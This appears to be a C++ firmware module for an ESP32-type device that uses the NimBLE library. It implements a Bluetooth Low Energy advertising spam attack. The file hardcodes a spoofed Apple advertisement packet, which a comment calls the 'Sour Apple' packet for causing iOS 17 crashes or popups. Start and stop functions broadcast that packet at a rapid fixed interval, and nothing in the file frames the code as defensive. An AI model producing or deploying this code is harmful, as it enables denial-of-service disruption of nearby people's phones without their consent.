#include "Attack_BLE.h"
#include <NimBLEDevice.h>

NimBLEAdvertising *pAdvertising;
bool bleActive = false;

// "Sour Apple" Packet (iOS 17 Crash / Popup)
const uint8_t appleSpamData[] = {
    0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC0, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void StartBLESpam() {
    if (bleActive) return;
    
    // Initialize if not already initialized
    if(!NimBLEDevice::getInitialized()) NimBLEDevice::init("");
    
    NimBLEServer *pServer = NimBLEDevice::createServer();
    pAdvertising = NimBLEDevice::getAdvertising();

    NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
    oAdvertisementData.addData(std::string((char*)appleSpamData, sizeof(appleSpamData)));
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->setMinInterval(32); 
    pAdvertising->setMaxInterval(32); 
    pAdvertising->start();
    
    bleActive = true;
}

void RunBLESpamLoop() {
    delay(100); 
}

void StopBLESpam() {
    if(bleActive) {
        pAdvertising->stop();
        NimBLEDevice::deinit(true);
        bleActive = false;
    }
}